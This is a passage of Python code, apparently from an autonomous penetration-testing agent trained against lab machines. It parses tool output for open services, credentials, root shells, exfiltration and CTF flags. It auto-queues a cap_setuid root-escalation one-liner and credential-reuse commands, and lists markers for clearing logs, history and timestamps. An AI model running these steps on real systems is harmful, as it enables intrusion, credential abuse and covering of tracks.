            # e.g. "exploit/unix/irc/unreal_ircd" → "irc" matched as service
            _clean_output = re.sub(
                r'(?:exploit|auxiliary|post|payload)/\S+',
                '', _clean_output
            )
            service_patterns = {
                "ssh": r"\bssh\b|openssh|sshd",
                "http": r"\bhttp\b[^s:/]|apache|nginx|\biis\b|web server|http/\d",
                "https": r"\bhttps\b[^:/]|ssl/|tls/|443/tcp",
                "smb": r"\bsmb\b|\bsamba\b|microsoft-ds|445/tcp",
                "ftp": r"\bftp\b|vsftpd|proftpd|21/tcp",
                "mysql": r"\bmysql\b|mariadb|3306/tcp",
                "mssql": r"ms-sql|mssql|1433/tcp",
                "postgresql": r"postgresql|postgres\b|5432/tcp",
                "rdp": r"\brdp\b|3389/tcp|remote desktop",
                "smtp": r"\bsmtp\b|postfix|sendmail|25/tcp",
                "telnet": r"\btelnet\b|23/tcp",
                "dns": r"\bdomain\b|bind/|53/tcp",
                "irc": r"\birc\b|unrealircd|6667/tcp",
                "vnc": r"\bvnc\b|5900/tcp",
                "rmi": r"java-rmi|rmi\b|1099/tcp",
                "distcc": r"distccd|distcc\b|3632/tcp",
                "nfs": r"\bnfs\b|2049/tcp",
                "tomcat": r"\btomcat\b|8180/tcp|8009/tcp|\bajp\b",
            }

            # Phase 38: ServiceBinding — map services to their canonical ports.
            # If output explicitly mentions "PORT/tcp open SERVICE" it's trusted.
            # Otherwise, require the canonical port to be in discovery_board.
            _SERVICE_CANONICAL_PORTS: Dict[str, set] = {
                "ssh": {22, 2222},
                "http": {80, 8080, 8000, 8888},
                "https": {443, 8443},
                "smb": {139, 445},
                "ftp": {21},
                "mysql": {3306},
                "mssql": {1433},
                "postgresql": {5432},
                "rdp": {3389},
                "smtp": {25, 587},
                "telnet": {23},
                "dns": {53},
                "irc": {6667, 6697},
                "vnc": {5900, 5901},
                "rmi": {1099},
                "distcc": {3632},
                "nfs": {2049, 111},
                "tomcat": {8080, 8180, 8009},
            }
            # Gather known open ports from discovery_board and current discoveries
            _known_open_ports: set = set()
            for _bp in self.discovery_board.get("ports", set()):
                try:
                    _known_open_ports.add(int(_bp))
                except (ValueError, TypeError):
                    pass
            for _dp in discoveries.get("open_port", []):
                try:
                    _known_open_ports.add(int(_dp))
                except (ValueError, TypeError):
                    pass

            # Check if output explicitly says "PORT/tcp open SERVICE" (nmap format)
            _explicit_port_services: set = set()
            for _m in re.finditer(r'(\d+)/tcp\s+open\s+(\S+)', _clean_output):
                _explicit_port_services.add(_m.group(2).lower())
                try:
                    _known_open_ports.add(int(_m.group(1)))
                except (ValueError, TypeError):
                    pass

            for svc, pattern in service_patterns.items():
                if re.search(pattern, _clean_output):
                    # Phase 38: Validate service against known open ports
                    _svc_ports = _SERVICE_CANONICAL_PORTS.get(svc, set())
                    _port_bound = bool(_known_open_ports & _svc_ports) if _svc_ports else True
                    _explicitly_reported = svc in _explicit_port_services
                    if not _port_bound and not _explicitly_reported:
                        logger.debug(
                            f"[SVC-BIND] Rejected service '{svc}': "
                            f"canonical ports {_svc_ports} not in open ports {_known_open_ports}"
                        )
                        continue
                    if "service" not in discoveries:
                        discoveries["service"] = []
                    if svc not in discoveries.get("service", []):
                        discoveries["service"].append(svc)
        
        # ─── Phase 5: Version info discovery ─────────────────────────
        # Phase 39: Guard with skip_discovery_parse — searchsploit/msfconsole
        # output contains version strings ("OpenSSH 8.2p1", "vsftpd 3.0.3")
        # in exploit TITLES, not from scanning the target.
        if not skip_discovery_parse:
            version_patterns = [
                r"(?:vsftpd|openssh|apache|samba|mysql|postgresql|tomcat|unrealircd|distccd|bind|php|ruby|python)\s*[\d\.]+[^\s]*",
                r"(?:Server|banner):\s*\S+[\s/][\d\.]+",
                r"(?:version|ver):\s*[\d\.]+",
            ]
            versions_found = []
            for pattern in version_patterns:
                matches = re.findall(pattern, output, re.IGNORECASE)
                versions_found.extend(matches)
            if versions_found:
                discoveries["version_info"] = list(set(v.strip() for v in versions_found[:5]))
        
        # Credential patterns (enhanced)
        # Phase 8.2 Batch 14: Skip for reference commands (msfconsole search
        # output contains "password", "Login" in module names/descriptions)
        # Phase 38: 3-stage credential sanitization: detect → validate → confirm
        if not skip_discovery_parse:
            # Stage 1: Raw detection — broad patterns
            cred_patterns = [
                r"password[:\s]+\S+",
                r"login:\s*\w+\s+password",
                r"\(Pwn3d!\)",
                r"NTLMv[12] Hash:",
                r"valid credentials",
                r"authentication successful",
                r"Login successful",
                r"password hashes cracked",
                r"Key found:",
                # FTP USER/PASS from PCAP strings output (e.g. Cap box)
                r"(?:^|\n)USER\s+(?!anonymous|ftp)\w+",
                r"\bPASS\s+\S{4,}",
            ]
            # Stage 2: False-positive rejection patterns
            _cred_false_positives = [
                r"password[:\s]+\*+",          # masked passwords like "password: ****"
                r"password[:\s]+<\w+>",        # template placeholders like "password: <pass>"
                r"password[:\s]+\{",           # variable substitutions like "password: {var}"
                r"password[:\s]+\$\{?\w+",     # env vars like "password: $PASS"
                r"password[:\s]+none",         # explicit "none"
                r"password[:\s]+unknown",      # unknown
                r"password[:\s]+N/A",          # N/A
                r"password[:\s]+required",     # "password required"
                r"password[:\s]+file",         # "password file"
                r"password[:\s]+authentication",  # "password authentication"
                r"password[:\s]+policy",       # "password policy"
                r"password[:\s]+expired",      # "password expired"
                r"password[:\s]+change",       # "password change"
                r"password[:\s]+reset",        # "password reset"
                r"password[:\s]+for\s",        # "password for user"
                # Phase 39: Brute-force tool failure patterns
                r"0 valid passwords? found",   # hydra failure summary
                r"0 of \d+ target.* completed.*0 valid",  # hydra final line
                r"no valid passwords? found",  # generic brute-force failure
                r"password.*not found",        # password not found
                r"LOGIN_FAILED",               # patator/medusa failure
                r"authentication failed",      # generic auth failure
                r"Access denied",              # explicit access denied
                r"incorrect password",         # wrong password
                r"invalid password",           # invalid password
                r"wrong password",             # wrong password
            ]
            _raw_cred_detected = False
            for pattern in cred_patterns:
                if re.search(pattern, output, re.IGNORECASE):
                    _raw_cred_detected = True
                    break

            # Stage 2: Validate — reject false positives
            if _raw_cred_detected:
                _is_false_positive = False
                for _fp_pat in _cred_false_positives:
                    if re.search(_fp_pat, output, re.IGNORECASE):
                        _is_false_positive = True
                        logger.debug(
                            f"[CRED-SANITIZE] Rejected false-positive credential: "
                            f"matched '{_fp_pat}'"
                        )
                        break

                # Stage 3: Confirm — only set if not a false positive
                if not _is_false_positive and not _skip_critical_discoveries:
                    discoveries["credential"] = "password_found"
        
        # User discovery
        # Phase 39 Fix-14: Guard with skip_discovery_parse
        if not skip_discovery_parse:
            # Phase 39: Suppress hydra login: pattern if brute-force failed
            _hydra_failed = bool(re.search(
                r"0 valid passwords? found|0 of \d+ target.* completed.*0 valid",
                output, re.IGNORECASE
            ))
            user_patterns = [
                r"user:\[(\w+)\]",             # rpcclient
                r"user found:\s*(\w+)",        # wpscan
                r"Admin Email:\s*(\S+)",       # whois
                r"VALID USERNAME:\s*(\w+)",    # kerbrute
                r"User:\s*(\w+)\s+Password",  # patator/medusa
                r"VRFY\s+(\w+)\s+\(250",      # smtp-user-enum
            ]
            # Only include hydra login: pattern if hydra actually succeeded
            if not _hydra_failed:
                user_patterns.append(r"login:\s*(\w+)")  # hydra success
            users = []
            for pattern in user_patterns:
                users.extend(re.findall(pattern, output, re.IGNORECASE))
            if users:
                discoveries["user"] = list(set(users))
        
        # Vulnerability patterns
        # Phase 8.2 Batch 14: Skip for reference commands (msfconsole search
        # output is FULL of "exploit", "vulnerability", "SQL Injection", "Backdoor"
        # in module names — these are NOT actual discoveries from the target)
        if not skip_discovery_parse:
            vuln_patterns = [
                r"CVE-\d{4}-\d+",              # CVE IDs
                r"vulnerable|vulnerability",
                r"exploit|exploitable",
                r"OSVDB-\d+",
                r"Remote Code Execution",
                r"Buffer Overflow",
                r"SQL Injection",
                r"Path Traversal",
                r"Backdoor",
                r"Command Execution",
                r"command injection",
                r"XSS vulnerability",
            ]
            for pattern in vuln_patterns:
                if re.search(pattern, output, re.IGNORECASE):
                    if not _skip_critical_discoveries:
                        discoveries["vulnerability"] = True
                        # Extract CVE IDs
                        cves = re.findall(r"CVE-\d{4}-\d+", output, re.IGNORECASE)
                        if cves:
                            discoveries["cve"] = list(set(cves))
                    break
        
        # Directory/path discovery (web)
        # Phase 39 Fix-14: Guard with skip_discovery_parse — exploit tool
        # output can contain path-like strings that falsely trigger web_path
        if not skip_discovery_parse:
            # Match Status: 200, 301, 302, 403 (all indicate valid paths)
            if re.search(r"(?:Status:|CODE:)\s*(?:200|301|302|403)", output):
                # ffuf/gobuster format: "path  [Status: 200, ...]" or "/path (Status: 200)"
                path_matches_200 = re.findall(
                    r"([\w\-\.]+)\s+\[Status:\s*(?:200|301)\b",
                    output,
                )
                path_matches_302 = re.findall(
                    r"([\w\-\.]+)\s+\[Status:\s*302\b",
                    output,
                )
                # Also catch nmap/dirb format: "/path (Status: 200)"
                path_matches_200 += re.findall(
                    r"/([\w\-\.]+)(?:\s*\(Status:\s*(?:200|301))",
                    output,
                )
                path_matches_302 += re.findall(
                    r"/([\w\-\.]+)(?:\s*\(Status:\s*302)",
                    output,
                )
                # Phase 39: Mass-302 redirect filter — if nearly ALL
                # responses are 302, the target has a catch-all redirect
                # (common with CrushFTP/nginx).  Only keep 200/301 hits
                # in that case.  Cap web_path discoveries at 30 max.
                _total = len(path_matches_200) + len(path_matches_302)
                if _total > 10 and len(path_matches_302) / max(_total, 1) > 0.7:
                    logger.info(
                        f"[P39-302-FILTER] Suppressed {len(path_matches_302)} mass-302 "
                        f"redirects ({len(path_matches_200)} real 200/301 kept)"
                    )
                    path_matches = path_matches_200
                else:
                    path_matches = path_matches_200 + path_matches_302
                if path_matches:
                    discoveries["web_path"] = list(set(
                        p for p in path_matches if p and len(p) > 1
                    ))[:30]
                    discoveries["directory"] = True
            # Also catch feroxbuster/dirsearch format
            ferox_paths = re.findall(r"(?:(?:200|301|302)\s+GET\s+|^\[(?:200|301|302)\]\s*http://\S+?)((?:/[\w\-\.]+)+)", output, re.MULTILINE)
            if ferox_paths:
                _existing = discoveries.get("web_path", [])
                discoveries["web_path"] = list(set(_existing + [p.strip("/").split("/")[-1] for p in ferox_paths]))[:30]
                discoveries["directory"] = True
            # Phase 39: Filter out local filesystem paths from web_path discoveries
            _local_prefixes = (
                "/usr/", "/etc/", "/var/", "/home/", "/bin/", "/sbin/",
                "/lib/", "/tmp/", "/opt/", "/root/", "/dev/", "/proc/",
                "/sys/", "/run/", "/snap/",
            )
            if "web_path" in discoveries:
                discoveries["web_path"] = [
                    p for p in discoveries["web_path"]
                    if not any(p.startswith(pfx) or f"/{p}".startswith(pfx) for pfx in _local_prefixes)
                ]
                if not discoveries["web_path"]:
                    del discoveries["web_path"]
        
        # ─── Phase 5: Subdomain discovery ────────────────────────────
        # Phase 6.5: Tightened — require valid subdomain format (not IPs or version strings)
        # Phase 39 Fix-14: Guard with skip_discovery_parse
        if not skip_discovery_parse:
            subdomain_patterns = [
                r"((?:[a-z][a-z0-9\-]+\.){2,}[a-z]{2,})\s*(?:->|→|-->)\s*\d+\.\d+",  # fierce/amass
            ]
            subdomains = set()
            for pattern in subdomain_patterns:
                for m in re.findall(pattern, output, re.IGNORECASE):
                    # Reject IP-like or version-like strings
                    if not re.match(r'^\d', m) and '.' in m and len(m) > 5:
                        subdomains.add(m)
            if subdomains:
                discoveries["subdomain"] = list(subdomains)[:10]
        
        # ─── Phase 5: DNS record discovery ───────────────────────────
        # Phase 6.5: Tightened — only match real DNS zone-file format lines
        # Phase 39 Fix-14: Guard with skip_discovery_parse
        if not skip_discovery_parse:
            dns_records = []
            dns_patterns = [
                r"^(\S+)\.\s+\d+\s+IN\s+(A|AAAA|MX|NS|TXT|CNAME|SOA)\s+(\S+)$",
            ]
            for pattern in dns_patterns:
                matches = re.findall(pattern, output, re.MULTILINE | re.IGNORECASE)
                for m in matches:
                    if len(m) >= 3 and len(m[0]) > 2 and '.' in m[0]:
                        dns_records.append({"type": m[1], "value": m[2]})
            if dns_records:
                discoveries["dns_record"] = dns_records[:8]
        
        # ─── Phase 5: Web parameter discovery ────────────────────────
        # Phase 39 Fix-14: Guard with skip_discovery_parse
        if not skip_discovery_parse:
            param_patterns = [
                r"(?:parameter|param)s?\s*(?:found|discovered)?:?\s*([\w,\s]+)",
                r"\?(\w+)=(?:FUZZ|test|id)",
                r"Valid parameters found:\s*(.+?)$",
            ]
            params = set()
            for pattern in param_patterns:
                matches = re.findall(pattern, output, re.IGNORECASE | re.MULTILINE)
                for m in matches:
                    for p in re.split(r"[,\s]+", m):
                        p = p.strip()
                        if p and len(p) > 1 and p.isalnum():
                            params.add(p)
            if params:
                discoveries["web_parameter"] = list(params)[:10]
        
        # ─── Phase 5: API endpoint discovery ─────────────────────────
        # Phase 39 Fix-14: Guard with skip_discovery_parse
        if not skip_discovery_parse:
            api_patterns = [
                r"((?:/api/[\w/\-]+)+)",
                r"\[(?:url|linkfinder)\]\s*(http\S*/api\S*)",
            ]
            endpoints = set()
            for pattern in api_patterns:
                matches = re.findall(pattern, output, re.IGNORECASE)
                endpoints.update(matches)
            if endpoints:
                discoveries["api_endpoint"] = list(endpoints)[:8]
        
        # Share discovery (SMB)
        # Phase 39 Fix-14: Guard with skip_discovery_parse
        if not skip_discovery_parse:
            share_matches = re.findall(r"(?:Disk|IPC):\s*(\w+)|\\\\[^\\]+\\(\w+)", output)
            if share_matches:
                shares = [s[0] or s[1] for s in share_matches if s[0] or s[1]]
                if shares:
                    discoveries["smb_share"] = list(set(shares))
        
        # File discovery (sensitive files)
        # Phase 8.2 Batch 14: Skip for reference commands
        if not skip_discovery_parse:
            sensitive_patterns = [
                r"\.ssh/id_rsa",
                r"\.htaccess",
                r"\.backup",
                r"password",
                r"\.env",
                r"config\.",
                r"wp-config",
                r"db_dump",
                r"\.sql",
            ]
            for pattern in sensitive_patterns:
                if re.search(pattern, output_lower):
                    discoveries["sensitive_file"] = True
                    break
        
        # Shell indicators (Phase 6.5: expanded for MS2 live output)
        # NOTE: Keep patterns specific to REMOTE shell evidence.
        # Avoid matching local `id` or `whoami` output (which runs on attacker host).
        # Phase 8.2 Batch 13: Added generic uid= pattern for MS3 non-root shells
        shell_patterns = [
            r"shell\s*session\s*\d+\s*opened",
            r"www-data@",
            r"root@(?:metasploitable|localhost|target)",
            r"meterpreter\s*>",
            r"msfadmin@metasploitable",           # specific MS2 login prompt
            r"msfadmin@metasploitable3",          # specific MS3 login prompt
            r"uid=0\(root\)\s+gid=0",             # root shell
            r"uid=\d+\([a-z]\w+\)\s+gid=\d+",    # Batch 13: any valid uid= shell output
            r"nt authority\\\\system",
            r"[Bb]ackdoor.*spawned",
            r"ingreslock.*root",                  # ingreslock backdoor
            r"Connected to.*\nroot@",             # telnet to backdoor (real newline)
            r"Command shell session \d+ opened",  # msfconsole shell
            r"root@metasploitable",               # specific MS2 root prompt
        ]
        
        for pattern in shell_patterns:
            if re.search(pattern, output, re.MULTILINE | re.IGNORECASE):
                if not _skip_critical_discoveries:
                    discoveries["shell"] = True
                    # Root shell detection — keep specific to avoid false positives
                    # Phase 8.2 Batch 13: Also detect sudo -S id output showing root
                    if re.search(r"root@metasploitable|uid=0\(root\)|nt authority\\\\system|domain admin|meterpreter.*root|echo msfadmin.*sudo.*uid=0", output, re.IGNORECASE):
                        discoveries["root_shell"] = True
                break
        
        # ─── Phase 11.1: User/Root flag detection ────────────────────
        # Detect CTF-style flags in command output (user.txt, root.txt, FLAG{}, HTB{})
        flag_patterns = [
            r"FLAG\{[^}]+\}",                       # FLAG{...} format
            r"HTB\{[^}]+\}",                        # HTB{...} format
            r"flag\{[^}]+\}",                       # flag{...} format
            r"[a-f0-9]{32}",                        # 32-char hex hash (common flag format)
        ]
        # Only detect flags from commands that read flag files
        _is_flag_read = any(f in cmd_lower for f in [
            "user.txt", "root.txt", "flag.txt", "proof.txt",
            "local.txt", "user_flag", "root_flag",
            "cat /root/", "cat /home/",
        ])
        if _is_flag_read:
            for pattern in flag_patterns:
                flag_match = re.search(pattern, output, re.IGNORECASE)
                if flag_match:
                    flag_value = flag_match.group(0)
                    # Determine if user or root flag based on command context
                    if any(rf in cmd_lower for rf in ["root.txt", "root_flag", "cat /root/", "proof.txt"]):
                        discoveries["root_flag"] = flag_value
                        discoveries["flag"] = flag_value
                    else:
                        discoveries["user_flag"] = flag_value
                        discoveries["flag"] = flag_value
                    break
        
        # Hash/credential dump patterns → triggers LATERAL_MOVEMENT
        # Phase 8.2 Batch 14: Skip for reference commands
        if not skip_discovery_parse:
            hash_patterns = [
                r"NTLMv[12]\s*Hash",
                r"[a-f0-9]{32}:{3}",               # NT hash format
                r"\$krb5tgs\$",                      # Kerberoast
                r"\$krb5asrep\$",                    # AS-REP roast
                r"Hash\s*dumped",
                r"secretsdump|hashdump",
                r"mimikatz.*NTLM",
                # R53: Linux /etc/shadow hash formats — critical for MS2
                # These were missing, causing hash_known to never be set from
                # shadow file reads. Matches: root:$6$..., root:$1$..., etc.
                r"root:\$[156]\$",                   # root shadow hash (SHA-512, MD5, SHA-256)
                r"msfadmin:\$[156]\$",               # msfadmin shadow hash
                r"\w+:\$[156]\$[^\s:]+:",            # Generic user:$hash$salt:... format
            ]
            for pattern in hash_patterns:
                if re.search(pattern, output, re.IGNORECASE):
                    discoveries["hash_dump"] = True
                    break

        # Lateral movement indicators → triggers LATERAL_MOVEMENT
        # Phase 8.2 Batch 14: Skip for reference commands
        if not skip_discovery_parse:
            lateral_patterns = [
                r"Lateral target:\s*\S+",
                r"Domain Admin found",
                r"PsExec|WmiExec|SmbExec|AtExec|DcomExec",
                r"Evil-WinRM shell",
                r"proxychains.*OK",
                r"Tunnel established",
                r"session#\d+:\s*tun pair",
            ]
            for pattern in lateral_patterns:
                if re.search(pattern, output, re.IGNORECASE):
                    discoveries["lateral_target"] = True
                    break

        # Domain admin indicators → triggers POST_EXPLOITATION
        # Phase 8.2 Batch 14: Skip for reference commands
        if not skip_discovery_parse:
            domain_admin_patterns = [
                r"Domain\s*Admin",
                r"nt authority\\system",
                r"Enterprise\s*Admin",
                r"memberOf.*Domain Admins",
            ]
            for pattern in domain_admin_patterns:
                if re.search(pattern, output, re.IGNORECASE):
                    discoveries["domain_admin"] = True
                    break
        
        # Persistence indicators → triggers EXFILTRATION
        persistence_patterns = [
            r"Persistence\s*(cron|added|established|installed)",
            r"crontab.*backup|systemd.*service\s*enabled",
            r"Registry\s*key\s*(added|set)",
            r"backdoor.*installed|implant.*deployed",
            r"ssh.*authorized_keys|\.ssh/authorized_keys",
            r"scheduled\s*task\s*created",
            r"backdoor user",
        ]
        for pattern in persistence_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                discoveries["persistence"] = True
                break
        
        # Data exfiltration indicators → triggers EXFILTRATION
        exfil_patterns = [
            r"exfiltrat(ed|ion|ing)",
            r"data\s*(extracted|downloaded|stolen|copied|transferred)",
            r"(file|archive|dump)\s*(uploaded|sent|exfil)",
            r"curl.*-F|wget.*--post-file|nc.*<\s*\S+",
            r"scp\s+\S+\s+\S+@",
            r"base64.*encoded.*sent",
        ]
        for pattern in exfil_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                discoveries["data_exfiltrated"] = True
                break
        
        # Database discovery
        if re.search(r"database|DBMS|mysql|postgresql|mssql|mongodb", output_lower):
            discoveries["database"] = True
            db_names = re.findall(r"(?:database|schema|Database)[\s:]+(\w+)", output, re.IGNORECASE)
            if not db_names:
                db_names = re.findall(r"^\|\s*(\w+)\s*\|", output, re.MULTILINE)
            if db_names:
                discoveries["db_name"] = list(set(db_names))
        
        # Closeout indicators → triggers CLOSEOUT completion
        closeout_patterns = [
            r"CLOSEOUT_TOOLS_REMOVED",
            r"CLOSEOUT_KEYS_REMOVED",
            r"CLOSEOUT_CRON_REMOVED",
            r"CLOSEOUT_TARGET_STABLE",
            r"CLOSEOUT_HISTORY_CLEARED",
            r"CLOSEOUT_AUTH_CLEARED",
            r"CLOSEOUT_LOGIN_LOGS_CLEARED",
            r"CLOSEOUT_FILES_SHREDDED",
            r"CLOSEOUT_TIMESTAMPS_FIXED",
            r"CLOSEOUT_SYSLOG_CLEARED",
            r"CLOSEOUT_KNOWN_HOSTS_REMOVED",
            r"artifacts?\s*(cleaned|removed|deleted)",
            r"closeout\s*(complete|done|finished)",
        ]
        for pattern in closeout_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                discoveries["artifacts_removed"] = True
                discoveries["closeout_completed"] = True
                break
        
        # HTB: Linux capability detection (getcap output)
        # Detect cap_setuid on Python or other binaries → queue exploitation
        cap_matches = re.findall(
            r'(\S+)\s*=\s*(?:\S*\s*)?(cap_setuid\S*)',
            output, re.IGNORECASE
        )
        if cap_matches:
            for binary_path, cap_name in cap_matches:
                cap_key = f"{os.path.basename(binary_path)}:{cap_name}"
                discoveries.setdefault("capability", []).append(cap_key)
                discoveries["vulnerability"] = True
                # Auto-queue cap_setuid exploitation if python3 found
                if "python" in binary_path.lower() and "cap_setuid" in cap_name.lower():
                    exploit_cmd = (
                        f"{binary_path} -c "
                        f"'import os; os.setuid(0); os.system(\"id && cat /root/root.txt 2>/dev/null && cat /home/*/user.txt 2>/dev/null\")'"
                    )
                    if not self.discovery_board.get("_cap_setuid_exploit_queued"):
                        self.discovery_board["_cap_setuid_exploit_queued"] = True
                        self.followup_queue.append({
                            "command": exploit_cmd,
                            "source": "cap_setuid_exploit",
                            "priority": 100,
                            "description": f"Exploit {binary_path} cap_setuid for root",
                            "service": "ssh",
                            "ttl": 20,
                        })
                        logger.warning(
                            f"[CAP-SETUID] Found {binary_path} with {cap_name} — "
                            f"queued root exploitation command"
                        )
        
        # ── Phase 35: Final IP-octet port filter (all sources) ──
        # SmartOutputParser LLM and regex can both extract IP octets as ports.
        # Apply the filter to ALL discovered ports regardless of source.
        if "open_port" in discoveries and discoveries["open_port"]:
            import re as _re_final
            _final_ip_octets: set = set()
            for _ip_m in _re_final.findall(
                r'\b(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\b', output
            ):
                _final_ip_octets.update(_ip_m)
            if _final_ip_octets:
                _before = list(discoveries["open_port"])
                discoveries["open_port"] = [
                    p for p in discoveries["open_port"]
                    if not (str(p) in _final_ip_octets and int(p) < 256
                            and not _re_final.search(
                                rf'\b{p}/(?:tcp|udp)\s+open', output.lower()
                            ))
                ]
                _removed = set(_before) - set(discoveries["open_port"])
                if _removed:
                    logger.debug(
                        f"[PORT-FILTER-FINAL] Removed IP-octet ports {_removed} "
                        f"from discoveries (all sources)"
                    )

        # ── Phase 35: Service connection-refused filter ──
        # If output shows connection refused/denied for a service, remove it.
        if "service" in discoveries and discoveries["service"]:
            _refused_patterns = [
                r"can't connect", r"connection refused", r"connection timed out",
                r"no route to host", r"host is down",
            ]
            _output_has_refused = any(
                r in output_lower for r in _refused_patterns
            )
            if _output_has_refused:
                # Only keep services confirmed by "X/tcp open" in output
                _confirmed_svcs = []
                for _svc in discoveries["service"]:
                    # Service is confirmed if its default port appears as open
                    _svc_port_map = {
                        "ftp": "21", "ssh": "22", "telnet": "23",
                        "smtp": "25", "dns": "53", "http": "80",
                        "irc": "6667", "https": "443", "smb": "445",
                    }
                    _dp = _svc_port_map.get(_svc, "")
                    if _dp and re.search(rf'\b{_dp}/(?:tcp|udp)\s+open', output_lower):
                        _confirmed_svcs.append(_svc)
                    elif not _dp:
                        # Unknown service port — keep it
                        _confirmed_svcs.append(_svc)
                    else:
                        logger.debug(
                            f"[SVC-FILTER] Removed '{_svc}' — connection refused/denied"
                        )
                discoveries["service"] = _confirmed_svcs

        # Phase 9.5: Cache regex fallback result
        if self._parse_cache is not None and agent_id:
            self._parse_cache.put(episode_id, step_idx, agent_id, output, discoveries)

        # Phase 40: Auto-detect target OS from output
        if self._pool_narrower is not None and output:
            try:
                self._pool_narrower.detect_os_from_output(output)
            except Exception:
                pass
        
        return discoveries
    
    def _get_agent_proposal(
        self,
        agent: Any,
        state: Dict[str, Any],
    ) -> Tuple[str, float]:
        """Get proposed action from agent (for comparison)."""
        try:
            if hasattr(agent, 'propose_action'):
                result = agent.propose_action(state)
                if isinstance(result, tuple):
                    return result[0], result[1] if len(result) > 1 else 0.5
                return str(result), 0.5
            
            if hasattr(agent, 'select_action'):
                return str(agent.select_action(state)), 0.5
            
            if hasattr(agent, 'get_action'):
                return str(agent.get_action(state)), 0.5
            
            return "noop", 0.3
            
        except Exception as e:
            logger.debug(f"Agent proposal failed: {e}")
            return "noop", 0.3
    
    def _execute_env_step(
        self,
        red_action: Optional[str],
        blue_action: Optional[str],
    ) -> Tuple[Any, Dict[str, Any], bool]:
        """Execute environment step."""
        try:
            action = red_action or "noop"
            result = self.env.step(action)
            
            if isinstance(result, tuple):
                new_state = result[0] if len(result) > 0 else {}
                reward = result[1] if len(result) > 1 else 0.0
                done = result[2] if len(result) > 2 else False
                
                return {"reward": reward, "output": str(new_state)}, new_state, done
            
            elif isinstance(result, dict):
                return result, result, result.get("done", False)
            
            return {"reward": 0.0}, {}, False
            
        except Exception as e:
            logger.debug(f"Env step failed: {e}")
            return {"reward": 0.0}, {}, False
    
    def _process_credential_discovery(
        self, output: str, command: str = ""
    ) -> None:
        """
        HTB Capability Upgrade: Extract structured credentials from command output
        and feed them to the LiveCommandExecutor for SSH auto-wrap.
        
        Called whenever agent_discoveries contains 'credential' == True.
        Parses the raw output for actual username:password pairs and:
        1. Stores them in discovery_board["credentials_list"]
        2. Sets them on LiveCommandExecutor for SSH auto-wrap
        3. Sets credentials_known state flag
        """
        try:
            from core.execution.cred_reuse import parse_credential_from_output
            
            creds = parse_credential_from_output(output, command)
            
            for cred in creds:
                cred_dict = {
                    "username": cred.username,
                    "password": cred.password,
                    "service": cred.source_service,
                    "source": cred.source,
                }
                
                # Avoid duplicates in credentials_list
                if cred_dict not in self.discovery_board.get("credentials_list", []):
                    self.discovery_board.setdefault("credentials_list", []).append(cred_dict)
                    
                    logger.debug(
                        f"[CRED-EXTRACT] Structured credential: "
                        f"{cred.username}:{cred.password[:3]}*** "
                        f"(service={cred.source_service}, source={cred.source})"
                    )
                    
                    # Feed to LiveCommandExecutor for SSH auto-wrap
                    if self.live_executor is not None:
                        self.live_executor.set_credentials(
                            cred.username, cred.password, cred.source_service
                        )
                    
                    # HTB T0.3: Feed to CredentialReuseEngine and auto-queue reuse commands
                    if self.cred_reuse_engine is not None:
                        is_new = self.cred_reuse_engine.add_credential(cred)
                        if is_new:
                            known_ports = {int(p) for p in self.discovery_board.get("ports", set())
                                           if str(p).isdigit()}
                            reuse_cmds = self.cred_reuse_engine.generate_reuse_commands(
                                cred, known_ports
                            )
                            for rcmd in reuse_cmds:
                                self.followup_queue.append({
                                    "command": rcmd["command"],
                                    "source": "cred_reuse",
                                    "priority": 100,  # Highest priority
                                    "description": rcmd.get("description", ""),
                                    "service": rcmd.get("service", ""),
                                    "ttl": 15,  # Valid for 15 more steps
                                })
                            if reuse_cmds:
                                logger.debug(
                                    f"[CRED-REUSE] Queued {len(reuse_cmds)} reuse commands "
                                    f"for {cred.username} in followup_queue: "
                                    f"{[c['service'] for c in reuse_cmds]}"
                                )
                            else:
                                logger.debug(
                                    f"[CRED-REUSE] No reuse cmds generated for {cred.username} "
                                    f"(known_ports={known_ports}, source_svc={cred.source_service})"
                                )
        except Exception as e:
            logger.debug(f"[CRED-EXTRACT] Error extracting structured creds: {e}")

    # ═════════════════════════════════════════════════════════════════════════
    # P35: Coherence Chain — per-step coherence check
    # ═════════════════════════════════════════════════════════════════════════

    def _run_coherence_pre_step(
        self, episode_id: str, step: int, current_phase: str
    ) -> None:
        """Build canonical state and run 4-step coherence chain before agents act."""
        if self.coherence_chain is None:
            return
        try:
            from core.state.canonical_state import CanonicalStateBuilder

            # Compute recent commands from action history
            _recent: list = []
            for cmds in self.action_history.values():
                _recent.extend(cmds[-5:])
            _recent = _recent[-10:]

            # Stagnation: max over all agents
            _stagnation = max(
                (self._steps_without_discoveries.get(a, 0) for a in self.agents),
                default=0,
            )

            canonical = CanonicalStateBuilder.build(
                episode_id=episode_id,
                step_id=step,
                discovery_board=self.discovery_board,
                current_phase=current_phase,
                steps_in_phase=self._steps_in_current_phase(),
                stagnation_steps=_stagnation,
                recent_commands=_recent,
            )

            result = self.coherence_chain.run(
                canonical, proposed_phase=current_phase, use_llm=True
            )
            self._last_coherence_result = result

            # Log contradiction warnings
            if result.contradiction.contradiction_detected:
                for c in result.contradiction.contradictions:
                    logger.warning(f"[P35-DESYNC] {c}")

        except Exception as e:
            logger.debug(f"[P35-COHERENCE] Error: {e}")
            import sys
            print(f"[P35-COHERENCE-ERR] {type(e).__name__}: {e}", file=sys.stderr, flush=True)

    def _steps_in_current_phase(self) -> int:
        """Return how many steps we've spent in the current phase."""
        if not self.attack_context:
            return 0
        phase_name = self.attack_context.current_phase.name
        start = self._phase_start_step.get(phase_name, 0)
        return max(0, self.current_step - start)

    def _generate_simulated_output(self, command: str) -> str:
        """Generate realistic simulated output for a command with discoverable patterns.

        Phase 6: PROBABILISTIC SUCCESS — Commands can now fail based on:
        1. Base success rate per command category (40-80%)
        2. Phase-gating: credentials only after RECON, shells only after creds
        3. Tool-specific failure modes (timeouts, connection refused, etc.)
        
        This teaches PPO that not every command works, and planning matters.
        """
        if not command:
            return ""
        
        import random
        import hashlib
        
        target = self.attack_context.target if self.attack_context else "10.10.10.10"
        cmd_lower = command.lower().split()[0] if command.split() else ""
        
        # Use command hash for deterministic but varied results
        cmd_hash = int(hashlib.md5(command.encode()).hexdigest()[:8], 16)
        random.seed(cmd_hash)
        
        # ─── PHASE 6: Phase-gating and probabilistic success ─────────
        # Skip probabilistic failure in test/deterministic mode
        sim_deterministic = getattr(self, '_sim_deterministic', False)
        
